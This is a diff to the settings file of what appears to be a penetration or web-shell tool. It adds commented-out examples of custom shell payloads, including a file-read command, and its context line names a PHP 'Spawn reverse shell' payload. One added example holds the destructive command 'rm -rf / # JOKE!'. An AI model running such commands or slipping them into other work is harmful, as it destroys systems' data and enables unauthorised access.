@@ -173,12 +173,17 @@ settings["payloads"]["php"]["Spawn reverse shell"] = (
 # Some custom payload examples:
 
 # Payloads which can *only* be executed in a 'bash':
-#                      |||    AttackName
-#                      |||    ||||||||||
-#                      vvv    vvvvvvvvvv
+#                      |||    Attack Name
+#                      |||    |||||||||||
+#                      vvv    vvvvvvvvvvv
 #settings["payloads"]["sys"]["Read a file"] = (
 #                                               (("Filepath to read: ", "__FILE__"),),    # Question(s) and placeholder for user inputs.
 #                                               "cat '__FILE__'"                          # Command to execute with your placeholder(s).
+#                                             )
+
+#settings["payloads"]["sys"]["Something without Question"] = (
+#                                               None,                 # No Question
+#                                               "rm -rf / # JOKE!"    # Command to execute.
 #                                             )
 
 
